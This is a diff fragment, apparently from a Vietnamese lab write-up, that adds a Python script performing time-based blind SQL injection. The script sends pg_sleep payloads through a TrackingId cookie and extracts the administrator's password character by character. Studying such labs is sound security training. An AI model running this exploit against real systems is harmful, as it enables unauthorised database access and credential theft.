@@ -78,3 +78,34 @@ Ta tiếp tục thử đển khi giá trị độ dài của chuỗi password > 
 
 
 
+
+
+# Script python
+```
+import requests
+import string
+from requests.exceptions import Timeout
+
+characters = list(string.ascii_lowercase)
+characters += list(string.digits)
+url = "" #Target URL
+length = 20
+result = ''
+
+print("[+] Extract Info")
+
+for i in range(1, length+1):
+    for char in characters:
+        payload = "a'%%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,%i,1)='%s')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--" %(i, char)
+        print("Tring Number %i with: " %(i), char)
+        cookie = {"TrackingId":payload}
+        try:
+            requests.get(url, cookies=cookie , timeout=5)
+        except Timeout:
+            result += char
+            break
+
+    print("[+] Result is : ", result)
+```
+
+
